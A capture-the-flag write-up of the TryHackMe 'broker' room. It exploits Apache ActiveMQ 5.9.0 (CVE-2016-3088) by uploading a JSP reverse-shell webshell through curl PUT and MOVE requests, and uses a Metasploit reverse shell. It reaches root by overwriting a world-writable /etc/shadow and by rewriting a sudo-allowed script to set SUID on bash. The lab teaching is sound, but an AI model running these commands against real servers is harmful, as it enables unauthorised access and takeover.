# broker

## Introduction

Welcome to my another writeup! In this TryHackMe [broker](https://tryhackme.com/room/broker) room, you'll learn: MQTT (IoT), file permission misconfiguration and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

> Paul and Max use a rather unconventional way to chat. They do not seem to know that eavesdropping is possible though...
>  
> Difficulty: Medium

---

Paul and Max found a way to chat at work by using a certain kind of software. They think they outsmarted their boss, but do not seem to know that eavesdropping is quite possible...They better be careful...

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# export RHOSTS=10.10.179.241
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4c75a07b4387704f7016d23cc4c5a4e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0E0J6enJ0afxy700qSiIX5MtF1OnZao36BxMDHd4z3X/fbRQc3WOsCzY9KsTw7RltG4bSBJGja3ppRbiLTowv+2aunR3nKPaR/Rea1NFCHPxonnYutUyqPsJIRnm+oV+hqd/rvn/BgLpdNo2bpWG1PG3gNVwmbuUqybL9XF3KoZz8gj6zZPJ+RV8yrM17R2bd1J7YgTMJBKSuKyzVQZJQHJMhdBLBOfVmF3PgajXe2Dm10xbL2rQ3Zsbbuk6hhc4Ypq1LYeZ1PA0aNuHoMzhjXlYQ3XElD5Rzr6rBo5LJr2VD2Y3mo86wyM6OZBb+B88Law3RJ4fwtjVgEoa2KX0F
|   256 f462b2adf862a0912f0a0e291adb70e4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyqJ0DAEyEKxeir3lNhPLTZNtDo/CfpLAKWpiSxZUd8NJIrcsNod31Tl+KSwMvNjNvW2ilD1YYxnO2A3FDApqg=
|   256 92d2877b9812459352035e9ec71871d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINqDlHwUjvqNDfhowAQHQMu7A/HVUijCXkxdkgpF/pSe
1883/tcp  open  mqtt?      syn-ack ttl 63
|_mqtt-subscribe: The script encountered an error: ssl failed
8161/tcp  open  http       syn-ack ttl 63 Jetty 7.6.9.v20130131
|_http-title: Apache ActiveMQ
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: 05664FB0C7AFCD6436179437E31F3AA6
|_http-server-header: Jetty(7.6.9.v20130131)
33113/tcp open  tcpwrapped syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 4 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
1883              | MQTT
8161              | Jetty 7.6.9.v20130131
33113             | Unknown

### HTTP on Port 8161

**Adding a new host to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# echo "$RHOSTS broker.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101210450.png)

In here, we see it's an **Apache ActiveMQ**!

Hmm... What is Apache ActiveMQ?

In their [official page](https://activemq.apache.org/), it says it's an **open source Java-based message broker**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101210649.png)

Now, in the home page, we can **manage ActiveMQ broker**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101210756.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101210831.png)

However, it require HTTP basic authentication.

In Apache ActiveMQ's [documentation](https://activemq.apache.org/getting-started#monitoring-activemq), **the default credentials are `admin:admin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101211126.png)

Let's try it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101211149.png)

We successfully accessed to the admin panel!

We also can see **the version** of this machine's Apache ActiveMQ:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101211255.png)

**Let's use `searchsploit` to search public exploits:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# searchsploit activemq
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
ActiveMQ < 5.14.0 - Web Shell Upload (Metasploit)                                 | java/remote/42283.rb
Apache ActiveMQ 5.11.1/5.13.2 - Directory Traversal / Command Execution           | windows/remote/40857.txt
Apache ActiveMQ 5.2/5.3 - Source Code Information Disclosure                      | multiple/remote/33868.txt
Apache ActiveMQ 5.3 - 'admin/queueBrowse' Cross-Site Scripting                    | multiple/remote/33905.txt
Apache ActiveMQ 5.x-5.11.1 - Directory Traversal Shell Upload (Metasploit)        | windows/remote/48181.rb
---------------------------------------------------------------------------------- ---------------------------------
```

Looks like **we can upload a web shell**.

But before that, let's enumerate the admin panel.

In the "Topics", we can see there is a `secret_chat` topic:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101211551.png)

We can use `mosquitto_sub` client utility to subscribe to an MQTT broker later on.

> Note: If you want to learn more about IoT hacking, check out TryHackMe's [Advent of Cyber 2022](https://tryhackme.com/room/adventofcyber4) room's Day 21

Then, in the "Connections", we see there is a connector MQTT:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101211938.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101211952.png)

It's IP address is local loopback.

**Armed with above information, we can use `mosquitto_sub` MQTT client to subscribe to the `secret_chat` topic:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# mosquitto_sub -h 'broker.thm' -t 'secret_chat' -V mqttv31
Paul: Hey, have you played the videogame 'Hacknet' yet?
Max: Yeah, honestly that's the one game that got me into hacking, since I wanted to know how hacking is 'for real', you know? ;)
Paul: Sounds awesome, I will totally try it out then ^^
Max: Nice! Gotta go now, the boss will kill us if he sees us chatting here at work. This broker is not meant to be used like that lol. See ya!
```

Looks like **they're talking a Steam game called Hacknet.**

> Fun fact: I also played Hacknet in February 11 2022.

## Initial Foothold

Now we know the machine's **Apache ActiveMQ version 5.9.0** and **it's vulnerable to RCE (Remote Code Execution) via web shell upload.**

### 1. Manually

**Now, we can mirror the `42283.rb` exploit:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# searchsploit -m 42283
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# cat 42283.rb | grep 'CVE'
          [ 'CVE', '2016-3088' ],
          [ 'URL', 'http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt' ]
```

We now know the exact CVE number of this vulnerability: `CVE-2016-3088`.

Let's google that:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101222036.png)

This vulnerability allows **remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request**.

**I also found a [Medium blog](https://medium.com/@knownsec404team/analysis-of-apache-activemq-remote-code-execution-vulnerability-cve-2016-3088-575f80924f30) from Knownsec 404 Team that talks about this vulnerability:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101222141.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101222241.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101222306.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101222311.png)

That being said, **we can upload a JSP webshell to the `fileserver`.**

- Create a JSP webshell:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# cp /usr/share/webshells/jsp/jsp-reverse.jsp .
```

**Remeber change the shell to `/bin/bash`:**
```java
Process proc = rt.exec("/bin/bash");
```

- Upload the webshell via PUT method:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# curl -vv -X PUT http://admin:admin@broker.thm:8161/fileserver/exploit.jsp -F "file=@jsp-reverse.jsp"
*   Trying 10.10.179.241:8161...
* Connected to broker.thm (10.10.179.241) port 8161 (#0)
* Server auth using Basic with user 'admin'
> PUT /fileserver/exploit.jsp HTTP/1.1
> Host: broker.thm:8161
> Authorization: Basic YWRtaW46YWRtaW4=
> User-Agent: curl/7.86.0
> Accept: */*
> Content-Length: 2665
> Content-Type: multipart/form-data; boundary=------------------------cb3b6e5bc9b096a7
> 
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 204 No Content
< Server: Jetty(7.6.9.v20130131)
< 
* Connection #0 to host broker.thm left intact
```

- Try to reach the webshell:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101223119.png)

As you can see, our JSP webshell doesn't work, as **it has no execute permissions in the `/fileserver/` directory.**

- To fix that, we can leak the absolute path:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# curl -vv -X PUT 'http://admin:admin@broker.thm:8161/fileserver/leak/%20/%20'
*   Trying 10.10.179.241:8161...
* Connected to broker.thm (10.10.179.241) port 8161 (#0)
* Server auth using Basic with user 'admin'
> PUT /fileserver/leak/%20/%20 HTTP/1.1
> Host: broker.thm:8161
> Authorization: Basic YWRtaW46YWRtaW4=
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 /opt/apache-activemq-5.9.0/webapps/fileserver/leak/ /  (No such file or directory)
< Content-Length: 0
< Server: Jetty(7.6.9.v20130131)
< 
* Connection #0 to host broker.thm left intact
```

The absolute path is in `/opt/apache-activemq-5.9.0/webapps/fileserver/`.

- Then, use MOVE method to move the JSP webshell to `/admin` directory:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# curl -vv -X MOVE -H 'Destination: file:///opt/apache-activemq-5.9.0/webapps/admin/exploit.jsp' 'http://admin:admin@broker.thm:8161/fileserver/exploit.jsp' 
*   Trying 10.10.179.241:8161...
* Connected to broker.thm (10.10.179.241) port 8161 (#0)
* Server auth using Basic with user 'admin'
> MOVE /fileserver/exploit.jsp HTTP/1.1
> Host: broker.thm:8161
> Authorization: Basic YWRtaW46YWRtaW4=
> User-Agent: curl/7.86.0
> Accept: */*
> Destination: file:///opt/apache-activemq-5.9.0/webapps/admin/exploit.jsp
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 204 No Content
< Server: Jetty(7.6.9.v20130131)
< 
* Connection #0 to host broker.thm left intact
```

**We now should able to use the webshell in `/admin/exploit.jsp`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101223717.png)

Let's get a reverse shell!

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# nc -lnvp 443
listening on [any] 443 ...
```

- Run the webshell:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/broker/images/Pasted%20image%2020230101223802.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# nc -lnvp 443                                                                                        
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.179.241] 37646
python3 -c "import pty;pty.spawn('/bin/bash')"
bash-5.0$ whoami;hostname;id;hostname -I
activemq
activemq
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
10.10.179.241 172.17.0.1
```

I'm user `activemq`!

### 2. MetaSploit

**Let's fire up MetaSploit and run the exploit:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# msfconsole
[...]
msf6 > search ActiveMQ

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_activemq_upload_jsp             2016-06-01       excellent  No     ActiveMQ web shell upload
   1  exploit/windows/http/apache_activemq_traversal_upload     2015-08-19       excellent  Yes    Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload
   2  auxiliary/scanner/http/apache_activemq_traversal                           normal     No     Apache ActiveMQ Directory Traversal
   3  auxiliary/scanner/http/apache_activemq_source_disclosure                   normal     No     Apache ActiveMQ JSP Files Source Disclosure
   4  exploit/windows/browser/samsung_security_manager_put      2016-08-05       excellent  No     Samsung Security Manager 1.4 ActiveMQ Broker Service PUT Method Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/browser/samsung_security_manager_put

msf6 > use 0
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_activemq_upload_jsp) > 
```

```
msf6 exploit(multi/http/apache_activemq_upload_jsp) > info

       Name: ActiveMQ web shell upload
     Module: exploit/multi/http/apache_activemq_upload_jsp
   Platform: Java, Linux, Windows
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2016-06-01

Provided by:
  Ian Anderson <andrsn84@gmail.com>
  Hillary Benson <1n7r1gu3@gmail.com>

Available targets:
  Id  Name
  --  ----
  0   Java Universal
  1   Linux
  2   Windows

Check supported:
  No

Basic options:
  Name           Current Setting  Required  Description
  ----           ---------------  --------  -----------
  AutoCleanup    true             no        Remove web shells after callback is received
  BasicAuthPass  admin            yes       The password for the specified username
  BasicAuthUser  admin            yes       The username to authenticate as
  JSP                             no        JSP name to use, excluding the .jsp extension (default: rando
                                            m)
  Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-
                                            framework/wiki/Using-Metasploit
  RPORT          8161             yes       The target port (TCP)
  SSL            false            no        Negotiate SSL/TLS for outgoing connections
  VHOST                           no        HTTP server virtual host

Payload information:

Description:
  The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0 
  allows remote attackers to upload and execute arbitrary files via an 
  HTTP PUT followed by an HTTP MOVE request.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2016-3088
  http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt
```

```
msf6 exploit(multi/http/apache_activemq_upload_jsp) > set RHOSTS broker.thm
RHOSTS => broker.thm
msf6 exploit(multi/http/apache_activemq_upload_jsp) > set LPORT 443
LPORT => 443
msf6 exploit(multi/http/apache_activemq_upload_jsp) > set LHOST tun0
msf6 exploit(multi/http/apache_activemq_upload_jsp) > exploit

[*] Started reverse TCP handler on 10.9.0.253:443 
[*] Uploading http://10.10.179.241:8161//opt/apache-activemq-5.9.0/webapps/api//ikNQqrmLia.jar
[*] Uploading http://10.10.179.241:8161//opt/apache-activemq-5.9.0/webapps/api//ikNQqrmLia.jsp
[*] Sending stage (58851 bytes) to 10.10.179.241
[+] Deleted /opt/apache-activemq-5.9.0/webapps/api//ikNQqrmLia.jar
[+] Deleted /opt/apache-activemq-5.9.0/webapps/api//ikNQqrmLia.jsp
[*] Meterpreter session 1 opened (10.9.0.253:443 -> 10.10.179.241:37626) at 2023-01-01 21:45:28 -0500

meterpreter > 
```

Nice! We got a shell!

**Upgrade meterpreter shell:**
```
msf6 exploit(multi/http/apache_activemq_upload_jsp) > sessions -u -1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_sys_process_kill
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.9.0.253:4433 
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(multi/http/apache_activemq_upload_jsp) > 
[*] Sending stage (1017704 bytes) to 10.10.179.241
[*] Meterpreter session 2 opened (10.9.0.253:4433 -> 10.10.179.241:33478) at 2023-01-01 21:50:13 -0500
[*] Stopping exploit/multi/handler

msf6 exploit(multi/http/apache_activemq_upload_jsp) > sessions -l

Active sessions
===============

  Id  Name  Type                    Information               Connection
  --  ----  ----                    -----------               ----------
  1         meterpreter java/linux  activemq @ activemq       10.9.0.253:443 -> 10.10.179.241:37626 (10.1
                                                              0.179.241)
  2         meterpreter x86/linux   activemq @ 10.10.179.241  10.9.0.253:4433 -> 10.10.179.241:33478 (10.
                                                              10.179.241)

msf6 exploit(multi/http/apache_activemq_upload_jsp) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 366 created.
Channel 1 created.
python3 -c "import pty;pty.spawn('/bin/bash')" 
activemq@activemq:/opt/apache-activemq-5.9.0$ whoami;hostname;id;hostname -I
activemq
activemq
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
10.10.179.241 172.17.0.1
```

I'm user `activemq`!

**flag.txt:**
```
activemq@activemq:/opt/apache-activemq-5.9.0$ cat /opt/apache-activemq-5.9.0/flag.txt
THM{Redacted}
```

## Privilege Escalation

> Note: **There are 2 ways to get root privilege.**

### 1. activemq to root

In the `hostname -I` second IP address, it's clear that **our current shell is inside a docker container (Default docker container IP range: `172.17.0.0/16`).**

**Also, in the `/` directory, we can see there is a `.dockerenv` file:** 
```
activemq@activemq:/opt/apache-activemq-5.9.0$ ls -lah /
total 76K
drwxr-xr-x   1 root root 4.0K Dec 26  2020 .
drwxr-xr-x   1 root root 4.0K Dec 26  2020 ..
-rwxr-xr-x   1 root root    0 Dec 26  2020 .dockerenv
[...]
```

Let's enumerate the machine!

**Check readable/writable `/etc/shadow` file:**
```
activemq@activemq:/opt/apache-activemq-5.9.0$ ls -lah /etc/shadow
-rwxrwxrwx 1 root shadow 768 Dec 25  2020 /etc/shadow
```

In here, we can see that **the `/etc/shadow` file is world-readable/writable/executable!**

**Let's read that!**
```
activemq@activemq:/opt/apache-activemq-5.9.0$ cat /etc/shadow
root:$6$p4QqejfFHI9${Redacted}.:18621:0:99999:7:::
daemon:*:18605:0:99999:7:::
bin:*:18605:0:99999:7:::
sys:*:18605:0:99999:7:::
sync:*:18605:0:99999:7:::
games:*:18605:0:99999:7:::
man:*:18605:0:99999:7:::
lp:*:18605:0:99999:7:::
mail:*:18605:0:99999:7:::
news:*:18605:0:99999:7:::
uucp:*:18605:0:99999:7:::
proxy:*:18605:0:99999:7:::
www-data:*:18605:0:99999:7:::
backup:*:18605:0:99999:7:::
list:*:18605:0:99999:7:::
irc:*:18605:0:99999:7:::
gnats:*:18605:0:99999:7:::
nobody:*:18605:0:99999:7:::
_apt:*:18605:0:99999:7:::
messagebus:*:18621:0:99999:7:::
activemq:$6$Ra/XClrOq2ltc.E.${Redacted}/:18621:0:99999:7:::
```

**Now, we can try to crack root's password hash via `john`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# echo 'root:$6$p4QqejfFHI9${Redacted}.:18621:0:99999:7:::' > root.txt
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt root.txt 
[...]
```

But no luck.

**Luckly, the `/etc/shadow` is world-writable. That being said, we can generate our own SHA-512 password hash:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/broker]
└─# mkpasswd -m sha-512 password
$6$9Z6z6EmYpHQYlLks$HwvqTojwcMUQwJqICq04d5AM3nype6HgX6gO6Q/SKXbECP89OpgsvsfQKHMibUD6vbZ90ME3fOTFLQevzbJ5X0
```

**Let's change root's password hash:**
```
activemq@activemq:/opt/apache-activemq-5.9.0$ cat << EOF > /etc/shadow
root:\$6\$9Z6z6EmYpHQYlLks\$HwvqTojwcMUQwJqICq04d5AM3nype6HgX6gO6Q/SKXbECP89OpgsvsfQKHMibUD6vbZ90ME3fOTFLQevzbJ5X0:18621:0:99999:7:::
daemon:*:18605:0:99999:7:::
bin:*:18605:0:99999:7:::
sys:*:18605:0:99999:7:::
sync:*:18605:0:99999:7:::
games:*:18605:0:99999:7:::
man:*:18605:0:99999:7:::
lp:*:18605:0:99999:7:::
mail:*:18605:0:99999:7:::
news:*:18605:0:99999:7:::
uucp:*:18605:0:99999:7:::
proxy:*:18605:0:99999:7:::
www-data:*:18605:0:99999:7:::
backup:*:18605:0:99999:7:::
list:*:18605:0:99999:7:::
irc:*:18605:0:99999:7:::
gnats:*:18605:0:99999:7:::
nobody:*:18605:0:99999:7:::
_apt:*:18605:0:99999:7:::
messagebus:*:18621:0:99999:7:::
activemq:\$6\$Ra/XClrOq2ltc.E.\${Redacted}/:18621:0:99999:7:::
> EOF
```

**Finally, Switch User to root:**
```
activemq@activemq:/opt/apache-activemq-5.9.0$ su root
su root
Password: password

root@activemq:/opt/apache-activemq-5.9.0# whoami;hostname;id;hostname -I
root
activemq
uid=0(root) gid=0(root) groups=0(root)
10.10.179.241 172.17.0.1 
```

I'm root! :D

### 2. activemq to root

**Let's check our Sudo permission:**
```
activemq@activemq:/opt/apache-activemq-5.9.0$ sudo -l
Matching Defaults entries for activemq on activemq:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User activemq may run the following commands on activemq:
    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```

As you can see, **we can run `/usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py` as root without password!**

```
activemq@activemq:/opt/apache-activemq-5.9.0$ ls -lah subscribe.py
-rw-rw-r-- 1 activemq activemq 768 Dec 25  2020 subscribe.py
```

And we have permission to modify that python script!

**Let's modify it!**
```
activemq@activemq:/opt/apache-activemq-5.9.0$ cat << EOF > subscribe.py
> import os
>
> os.system('chmod +s /bin/bash')
> EOF
```

This will add a SUID sticky bit to `/bin/bash`.

**Finally, run `/usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py` via sudo:**
```
activemq@activemq:/opt/apache-activemq-5.9.0$ sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```

**Verify `/bin/bash` has SUID sticky bit or not:**
```
activemq@activemq:/opt/apache-activemq-5.9.0$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash
```

**Nice! Let's spawn a Bash shell with SUID privilege (root):**
```
activemq@activemq:/opt/apache-activemq-5.9.0$ /bin/bash -p
bash-5.0# whoami;hostname;id;hostname -I
root
activemq
uid=1000(activemq) gid=1000(activemq) euid=0(root) egid=0(root) groups=0(root)
10.10.179.241 172.17.0.1
```

I'm root! :D

## Rooted

**root.txt:**
```
bash-5.0# cat /root/root.txt
THM{Redacted}
```

# Conclusion

What we've learned:

1. Using MQTT Client to Subscribe Topics
2. Exploiting Apache ActiveMQ via Web Shell Upload
3. Vertical Privilege Escalation via Modifying `/etc/shadow`
4. Vertical Privilege Escalation via Misconfigurated Sudo Permission